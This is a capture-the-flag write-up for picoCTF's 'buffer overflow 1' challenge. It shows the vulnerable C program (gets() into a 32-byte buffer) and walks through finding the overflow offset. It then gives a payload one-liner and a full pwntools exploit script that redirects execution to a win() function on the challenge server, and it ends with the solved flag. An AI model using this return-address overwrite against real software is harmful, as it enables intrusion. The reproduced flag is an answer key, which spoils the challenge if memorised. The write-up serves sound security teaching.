# buffer overflow 1
Binary Exploitation, 200 points

## Description:
> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

## Solution:

`vuln` allocates a buffer of size `BUFSIZE` (32) on the stack, then uses `gets` to read into it. 

If we read the man page about `gets`, we see the following recommendation:
> Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security.

Since `gets` is being used, we can override the buffer and take control of the stack, overriding `vuln`'s return address and changing it to `win`'s address.

The first step is to calculate the difference between the beginning of the buffer and the return address - this is the length of the "padding" we will need before placing our own return address.

We can use pwntools' `cyclic` utility for that:

```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_1# cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
root@kali:/media/sf_CTFs/pico/buffer_overflow_1# cyclic 100 | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
Segmentation fault
```

The program kindly prints out where it tried to jump to: 0x6161616c.
We can also find this information using `dmesg`:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_1# dmesg | grep vuln
[ 1416.812797] vuln[1935]: segfault at 6161616c ip 000000006161616c sp 00000000ffba3f40 error 14 in libc-2.27.so[f7d4c000+19000]
```

We return to `cyclic` and request it to calculate the padding length:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_1# cyclic -l 0x6161616c
44
```

So we need 44 bytes of padding.

Now, we just need the address of `win()`, and we can create our shellcode:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_1# objdump -t vuln | grep win
080485cb g     F .text  00000064              win
```

Putting it all together, we can run the exploit locally:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_1# python -c "from pwn import *;print('A'*44 + p32(0x080485cb))" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
```

This would have given us the flag if we were to run it on the server. However, let's create a full pwntools script in order to retrieve the flag from the server:

The script:
```python
from pwn import *
import argparse
import os

EXECUTABLE = "vuln"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba/"
SSH_SERVER = "2018shell3.picoctf.com"

def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_user = None):
    is_ssh = ssh_user is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(**params)
    else:
        p = process(**params)
    return p

def send_payload(proc, payload):
    proc.sendlineafter("Please enter your string:", payload)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
	os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")

	proc = process(get_process_path())
	payload = cyclic(100)
	send_payload(proc, payload)
	proc.wait()
	offset = cyclic_find(proc.corefile.eip)
	log.info("Overflow offset: {}".format(offset))
	return offset


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

e = ELF(get_process_path())
log.info("Address of win(): 0x{:02X}".format(e.symbols["win"]))
offset = get_overflow_offset()

p = get_process(args.ssh_user)
payload = fit({offset: e.symbols["win"]})
send_payload(p, payload)
print p.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_1# python exploit.py --ssh_user=$pico_ssh_user
[*] '/media/sf_CTFs/pico/buffer_overflow_1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] Address of win(): 0x80485CB
[+] Starting local process './vuln': pid 1120
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 1120)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/buffer_overflow_1/core.1120'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xfff81570
    Exe:       '/media/sf_CTFs/pico/buffer_overflow_1/vuln' (0x8048000)
    Fault:     0x6161616c
[*] Overflow offset: 44
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba/vuln' on 2018shell3.picoctf.com: pid 3352115
[+] Receiving all data: Done (101B)
[*] Stopped remote process 'vuln' on 2018shell3.picoctf.com (pid 3352115)

Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy56a7b196}
```

The flag: picoCTF{addr3ss3s_ar3_3asy56a7b196}